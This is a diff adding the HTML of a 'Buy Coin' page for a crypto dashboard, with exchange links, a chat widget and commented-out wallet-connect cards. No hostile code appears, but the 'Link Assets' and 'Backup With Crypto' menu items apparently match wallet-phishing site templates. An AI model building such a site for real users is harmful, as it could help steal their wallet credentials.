@@ -1,0 +1,2678 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <meta name="csrf-token" content="jA0iVqT8JIBdkMpn0xhuxcD7niZjH2RKQFLGg8QX">
+    <link rel="shortcut icon" type="image/png" href="images/icons/icon.png">
+    <title>
+        Buy Coin    </title>
+
+    
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.2/font/bootstrap-icons.css" rel="stylesheet">
+    <link href="css/boxicons.min.css" rel="stylesheet">
+    <link href="css/glightbox.min.css" rel="stylesheet">
+    <link href="css/remixicon.css" rel="stylesheet">
+    <link href="css/swiper-bundle.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/selectric.css">
+    <link rel="stylesheet" href="css/animate.min.css">
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+    <link rel="stylesheet" href="css/iziToast.min.css">
+    <link href="css/style.css" rel="stylesheet">
+    <script src="js/jquery.min.js"></script>
+
+    <!-- sweet alert -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.12/dist/sweetalert2.all.min.js" integrity="sha256-2Dbg51yxfa7qZ8CSKqsNxHtph8UHdgbzxXF9ANtyJHo=" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.12/dist/sweetalert2.min.css" integrity="sha256-7jUS+MWeqkFdmW9ozkZ7mPagz+QmMbsBlt+Q3MsE+FU=" crossorigin="anonymous">
+
+
+    <style>
+        @media (max-width: 991px) {
+            #header.header-inner-pages {
+                display: block;
+                background: transparent !important;
+                position: absolute;
+            }
+
+            .dashboard-body-part {
+                padding-top: 80px;
+                position: relative;
+                z-index: 1;
+            }
+
+            .dashboard-body-part::before {
+                position: absolute;
+                content: '';
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 160px;
+                background: linear-gradient(to top, #2f5b88, #153352);
+                z-index: -1;
+            }
+        }
+
+        .sp-referral .single-child {
+            padding: 6px 10px;
+            border-radius: 5px;
+        }
+
+        .sp-referral .single-child+.single-child {
+            margin-top: 15px;
+        }
+
+        .sp-referral .single-child p {
+            display: flex;
+            align-items: center;
+            margin-bottom: 0;
+        }
+
+        .sp-referral .single-child p img {
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            object-fit: cover;
+            -o-object-fit: cover;
+        }
+
+        .sp-referral .single-child p span {
+            width: calc(100% - 35px);
+            font-size: 14px;
+            padding-left: 10px;
+        }
+
+        .sp-referral>.single-child.root-child>p img {
+            border: 2px solid #c3c3c3;
+        }
+
+        .sub-child-list {
+            position: relative;
+            padding-left: 35px;
+        }
+
+        .sub-child-list::before {
+            position: absolute;
+            content: '';
+            top: 0;
+            left: 17px;
+            width: 1px;
+            height: 100%;
+            background-color: #a1a1a1;
+        }
+
+        .sub-child-list>.single-child {
+            position: relative;
+        }
+
+        .sub-child-list>.single-child::before {
+            position: absolute;
+            content: '';
+            left: -18px;
+            top: 21px;
+            width: 30px;
+            height: 5px;
+            border-left: 1px solid #a1a1a1;
+            border-bottom: 1px solid #a1a1a1;
+            border-radius: 0 0 0 5px;
+        }
+
+        .sub-child-list>.single-child>p img {
+            border: 2px solid #c3c3c3;
+        }
+    </style>
+<!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = 'fef8c00a48acba26f16c2853274d48d987e719e1';
+window.smartsupp||(function(d) {
+  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+  c.type='text/javascript';c.charset='utf-8';c.async=true;
+  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+</script>
+<noscript> Powered by <a href=“https://www.smartsupp.com” target=“_blank”>Smartsupp</a></noscript>
+</head>
+
+<body>
+    <div id="preloader"></div>
+    <!-- ======= Header ======= -->
+    <header id="header" class="fixed-top header-inner-pages">
+        <div class="container-fluid d-flex align-items-center justify-content-between">
+            <div class="d-flex flex-wrap align-items-center">
+                <div class="logo me-auto me-lg-0 ">
+                    <a href="dashboard.php">
+                        <img class="img-fluid rounded sm-device-img text-align" src="images/icons/whitelogo.png" width="100%" alt="pp">
+                    </a>
+                </div>
+            </div>
+            <div class="header-right d-flex">
+
+
+                <div class="dropdown ms-3">
+                    <button class="dropdown-toggle user-toggle-menu" type="button" id="dropdownMenuButton1" data-bs-toggle="dropdown" aria-expanded="false">
+                        <img src="images/user.png" alt="pp">
+                        <span class="ms-2">Promise Chukwu</span>
+                    </button>
+                    <ul class="dropdown-menu dropdown-menu-end" aria-labelledby="dropdownMenuButton1">
+                        <li><a class="dropdown-item" href="2fa.php">2fa</a></li>
+                        <li><a class="dropdown-item" href="profile_settings.php">Settings</a></li>
+                        <li><a class="dropdown-item" href="includes/logout.php">Logout</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </header><!-- End Header -->
+
+    <main id="main" class="dashboard-main">
+        <section class="dashboard-section">
+
+            <div class="d-sidebar">
+                <ul class="d-sidebar-menu">
+                    <li class="">
+                        <a href="dashboard.php"><i data-feather="home"></i> Dashboard</a>
+                    </li>
+                    <li class="">
+                        <a href="backup.php"><i data-feather="repeat"></i> Link Assets</a>
+                    </li>
+                    <li class="">
+                        <a href="backup_crypto.php" style="display: inline-flex; align-items: center;"><i style=" margin-right: 7px;" class="material-icons">&#xe5d5;</i><span> Backup With Crypto</span></a>
+                    </li>
+                    <li class="">
+                        <a href="withdraw1.php"><i data-feather="credit-card"></i> Withdarw</a>
+                    </li>
+
+                    <!-- <li class="has_submenu ">
+                        <a href="#0"><i data-feather="zap"></i> Investment</a>
+                        <ul class="submenu">
+                            <li class="">
+                                <a href=""><i data-feather="chevrons-right"></i></i> Investment plans</a>
+                            </li>
+                            <li class="">
+                                <a href=""><i data-feather="chevrons-right"></i> Invest log</a>
+                            </li>
+                        </ul>
+                    </li> -->
+                    <!-- 
+                    <li class="has_submenu ">
+                        <a href="#0"><i data-feather="briefcase"></i> Deposit</a>
+                        <ul class="submenu">
+                            <li class="">
+                                <a href="dashboard.php"><i data-feather="chevrons-right"></i> Backup Wi</a>
+                            </li>
+                            <li class="">
+                                <a href=""><i data-feather="chevrons-right"></i> Deposit log</a>
+                            </li>
+                        </ul>
+                    </li> -->
+
+                    <!-- <li class="has_submenu ">
+                        <a href="#0"><i data-feather="credit-card"></i> Withdraw</a>
+                        <ul class="submenu">
+                            <li class="">
+                                <a href="dashboard.php"><i data-feather="chevrons-right"></i> Withdraw</a>
+                            </li>
+                            <li class="">
+                                <a href=""><i data-feather="chevrons-right"></i> Withdraw log</a>
+                            </li>
+                        </ul>
+                    </li> -->
+
+                    <li class="active">
+                        <a href="buy_coin.php"><i class="fas fa-hand-holding-usd"></i> Buy Coin</a>
+                    </li>
+                    <li class="">
+                        <a href="apply_card.php"><i class="fa fa-credit-card" aria-hidden="true"></i>
+                            Cards</a>
+                    </li>
+
+
+                    <!-- <li class="">
+                        <a href="">
+                            <i data-feather="file-text"></i>
+                            Money transfer log
+                        </a>
+                    </li> -->
+
+
+                    <!-- <li class="">
+                        <a href=""><i data-feather="file-text"></i> Interest log</a>
+                    </li> -->
+
+                    <!-- <li class="">
+                        <a href=""><i data-feather="file-text"></i> Refferal log</a>
+                    </li> -->
+
+                    <li class="">
+                        <a href="2fa.php"><i data-feather="shield"></i> 2fa</a>
+                    </li>
+                    <li class="">
+                        <a href=""><i data-feather="life-buoy"></i> Support</a>
+                    </li>
+                    <li>
+                        <a href="includes/logout.php"><i data-feather="log-out"></i> Logout</a>
+                    </li>
+                </ul>
+                <div class="d-plan-notice mt-4 mx-3">
+                    <p class="mb-0">Your current plan
+                        -N/A</p>
+                    <a href="">Update plan <i class="fas fa-arrow-up"></i></a>
+                </div>
+            </div>
+
+
+
+
+            <!-- mobile bottom menu start -->
+            <div class="mobile-bottom-menu-wrapper">
+                <ul class="mobile-bottom-menu">
+                    <li>
+                        <a href="backup_crypto.php" class="">
+                            <i style=" margin-right: 7px;" class="material-icons">&#xe5d5;</i><span>
+                                <span>Backup Crypto</span>
+                        </a>
+                    </li>
+                    <!-- <li>
+                        <a href="apply_card.php" class="">
+                           <i class="fa fa-credit-card" aria-hidden="true"></i>
+                            <span>Cards</span>
+                        </a>
+                    </li> -->
+                    <li>
+                        <a href="backup.php" class="">
+                           <i class="fa fa-link" aria-hidden="true"></i>
+                            <span>Link Assets</span>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="dashboard.php" class="">
+                            <i class="bi bi-house-door"></i>
+                            <span>Home</span>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="withdraw1.php" class="">
+                            <i class="bi bi-cash-coin"></i>
+                            <span>Withdraw</span>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="buy_coin.php" class="active">
+                            <i class="fas fa-hand-holding-usd"></i>
+                            <span>Buy Coin</span>
+                        </a>
+                    </li>
+                </ul>
+            </div>
+
+           
+            <style>
+                #tidio-chat-iframe {
+                    inset: auto -7px 98px auto !important;
+                }
+            </style>
+
+<div class="dashboard-body-part">
+
+    <div class="mobile-page-header">
+        <h5 class="title">Deposit</h5>
+        <a href="dashboard.php" class="back-btn"><i class="bi bi-arrow-left"></i> Back</a>
+    </div>
+
+    <div class="row g-sm-4 g-3 justify-content-center">
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a style="background-color: black;" data-toggle="modal" href="https://www.simplex.com/" class="">
+                        <img src="images/icons/Simplex.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Simplex<i class="fas fa-google-wallet    "></i></h5>
+                    <a href="https://www.simplex.com/" class=""><button data-href="" data-id="" class="btn main-btn w-100 paynow mt-3">Buy Now</button></a>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a href="https://www.coinbase.com/" class="">
+                        <img src="images/icons/Coinbase.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Coinbase</h5>
+                    <a href="https://www.coinbase.com/" class=""> <button data-href="" data-id="lob" class=" btn main-btn w-100 paynow mt-3">Buy Now</button></a>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a href="https://paxful.com/" class="">
+                        <img src="images/icons/paxfullogo.jpg" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Paxful</h5>
+                    <a href="https://paxful.com/" class=""><button data-id="25" class=" btn main-btn w-100 paynow mt-3">Buy Now</button></a>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a href="https://luno.com/" class="">
+                        <img src="images/icons/luno.webp" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Luno</h5>
+                    <a href="https://www.luno.com/" class=""><button id="atomic" data-href="" data-id="24" class=" btn main-btn w-100 paynow mt-3">Buy Now</button></a>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a href="https://www.binance.com/" class="">
+                        <img src="images/icons/binance.jpg" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Binance</h5>
+                    <a href="https://www.binance.com/" class=""><button data-href="" class=" btn main-btn w-100 paynow mt-3">Buy Now</button></a>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a href="https://www.crypto.com/" class="">
+                        <img src="images/icons/crypto.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Crypto.com</h5>
+                    <a href="https://www.crypto.com/" class=""><button data-href="" data-id="20" id="" class=" btn main-btn w-100 paynow mt-3">Buy Now</button></a>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a href="https://www.bitcoin.com/" class="">
+                        <img src="images/icons/bitcoin.com.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Bitcoin</h5>
+                    <a href="https://www.bitcoin.com/" class=""><button id="money" data-href="" data-id="21" class=" btn main-btn w-100 paynow mt-3">Buy Now</button></a>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a href="https://www.etoro.com/" class="">
+                        <img src="images/icons/etoro.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">eToro</h5>
+                    <a href="https://www.etoro.com/" class=""><button id="gnosis_safe_multisig" data-href="" data-id="11" class=" btn main-btn w-100 paynow mt-3">Buy Now</button></a>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a href="https://www.kraken.com/" class="">
+                        <img src="images/icons/Kraken-Logo.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">kraken </h5>
+                    <a   href="https://www.kraken.com/" class=""><button id="crypto" data-href="" data-id="13" class=" btn main-btn w-100 paynow mt-3">Buy Now</button></a>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a  href="https://www.moonpay.com/#" class="">
+                        <img src="images/icons/MoonPay-900x0.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Moonpay</h5>
+                    <a   href="https://www.moonpay.com/" class=""><button id="pillar" data-href="" data-id="10" class=" btn main-btn w-100 paynow mt-3">Buy Now</button></a>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a href="https://www.cashapp.com/" class="">
+                        <img src="images/icons/Cash_App-Logo.wine.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">CashApp</h5>
+                    <a   href="https://www.cashapp.com/" class=""> <button  data-href="" data-id="7" class=" btn main-btn w-100 paynow mt-3">Buy Now</button></a>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a  href="https://www.bitpay.com/" class="">
+                        <img src="images/icons/bitpay-1573dd6c95eb38386f181048663590d0.jpg" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Bitpay</h5>
+                    <a  href="https://www.bitpay.com/" class=""><button data-href="" data-id="8" class=" btn main-btn w-100 paynow mt-3">Buy Now</button></a>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a href="https://blockchain.com/" class="">
+                        <img src="images/icons/blockchain1.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Blockchain</h5>
+                    <a   href="https://www.blockchain.com/" class=""><button data-href="" data-id="9" class="btn main-btn w-100 paynow mt-3">Buy Now</button></a>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a  href="https://www.webull.com/" class="">
+                        <img src="images/icons/WebullLogo-0728cf59141c4d76aa3c3e3ae1945d40.webp" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Webull</h5>
+                    <a  href="https://www.webull.com/" class=""><button  data-href="" data-id="6" class=" btn main-btn w-100 paynow mt-3">Webull</button></a>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a href="https://www.gemini.com/" class="">
+                        <img src="images/icons/gemini.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Gemini</h5>
+                    <a href="https://www.gemini.com/" class="">  <button id="bitpay" data-href="" data-id="5" class=" btn main-btn w-100 paynow mt-3">Buy Now</button></a>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a href="https://www.skrill.com" class="">
+                        <img src="images/icons/skrill.jpeg" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Skrill</h5>
+                    <a href="https://www.skrill.com/" class=""><button data-id="1" class=" btn main-btn w-100 paynow mt-3">Buy Now</button></a>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a  href="https://www.paypal.com/" class="">
+                        <img src="images/icons/PayPal-900x0.jpg" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Paypal </h5>
+                    <a  href="https://www.paypal.com/" class="">  <button data-id="2" class=" btn main-btn w-100 paynow mt-3">Buy Now</button><a  href="https://www.paypal.com/" class="">
+                </div>
+            </div>
+        </div>
+        <!-- <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="walleth" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/walleth-b60336f8dd9ea86285408cb4f96634d1.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Walleth</h5>
+                    <button id="walleth" data-href="" data-id="3" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="authereum" data-toggle="modal" href="#cmpltadminModal-7" class="wallet">
+                        <img src="images/icons/authereum-32f3939207b77c1837547d5ed4f86110.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Authereum <i class="fas fa-google-wallet    "></i></h5>
+                    <button id="authereum" data-href="" data-id="trust" class="wallet btn main-btn w-100 paynow mt-3 wallet">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="huobi_wallet" data-toggle="modal" href="#cmpltadminModal-7" class="wallet">
+                        <img src="images/icons/HuobiWallet.jpeg" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Huobi Wallet</h5>
+                    <button id="huobi_wallet" data-href="" data-id="lob" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="eidoo" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/Eidoo.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Eidoo</h5>
+                    <button id="eidoo" data-id="25" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="mykey" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/mykey-7419df5270c0406c80cba19fa5165923.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">MYKEY</h5>
+                    <button id="mykey" data-href="" data-id="24" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="loopring_wallet" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/LoopringWallet.jpeg" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Loopring Wallet</h5>
+                    <button data-href="" id="loopring_wallet" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="trustvault" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/trustvault-9031a67f82293fc50ead978f936cfff3.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">TrustVault</h5>
+                    <button id="trustvault" data-href="" data-id="20" id="" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="coin98" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/coin98-c5b50adaceaf474e48ef1dad150d0829.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Coin98</h5>
+                    <button id="coin98" data-href="" data-id="21" class="wallet btn main-btn w-100 paynow mt-3">Coneect</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="coolWallet" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/coolwallet-s-cc612ee7a151c1863293fcc69dd0f677.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">CoolWallet</h5>
+                    <button id="coolWallet" data-href="" data-id="11" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="alice" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/Alice.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Alice Wallet</h5>
+                    <button id="alice" data-href="" data-id="13" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="alphawallet" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/AlphaWallet.jpeg" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">AlphaWallet</h5>
+                    <button id="alphawallet" data-href="" data-id="10" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="dcent" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/dcentwallet-f0bdbaec0837431b87ac9886bb22dfd5.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">D'CENT Wallet</h5>
+                    <button id="dcent" data-href="" data-id="7" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="zelcore" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/zelcore-d4c1a7a444b95612f6373f0b536b6ccb.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">ZelCore Wallet</h5>
+                    <button id="zelcore" data-href="" data-id="8" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="nash" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/Nash.jpeg" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Nash Wallet</h5>
+                    <button id="nash" data-href="" data-id="9" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="coinomi" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/coinomi-7eecd68e38d78752d68b7232bd9c58d9.jpg" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Coinomi</h5>
+                    <button id="coinomi" data-href="" data-id="6" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="gridplus" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/gridplus-8cedce167d37ddaa02f2afdf55841d8c.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">GridPlus</h5>
+                    <button id="gridplus" data-href="" data-id="5" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="cybravo" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/CYBAVOWallet.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">CYBAVO Wallet</h5>
+                    <button id="cybravo" data-href="" data-id="1" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="tokenary" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/Tokenary.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Tokenary</h5>
+                    <button id="tokenary" data-href="" data-id="2" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="wazirx" data-toggle="modal" href="#" class="wallet">
+                        <img src="images/icons/Wazirx.png" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Wazirx</h5>
+                    <button id="wazirx" data-href="" data-id="3" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="torus" data-toggle="modal" href="#cmpltadminModal-7" class="wallet">
+                        <img src="images/icons/Torus.jpeg" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Torus <i class="fas fa-google-wallet    "></i></h5>
+                    <button id="trust" data-href="" data-id="trust" class="wallet btn main-btn w-100 paynow mt-3 wallet">Buy Now</button>
+                </div>
+            </div>
+        </div>
+        <div class="col-xxl-2 col-lg-3 col-sm-4 col-6">
+            <div class="payment-box text-center">
+                <div class="payment-box-thumb">
+                    <a id="spatium" data-toggle="modal" href="#cmpltadminModal-7" class="wallet">
+                        <img src="images/icons/Spatium.jpeg" alt="Lights" class="trans-img">
+                    </a>
+                </div>
+                <div class="payment-box-content">
+                    <h5 class="title">Spatium</h5>
+                    <button id="spatium" data-href="" data-id="lob" class="wallet btn main-btn w-100 paynow mt-3">Buy Now</button>
+                </div>
+            </div>
+        </div>
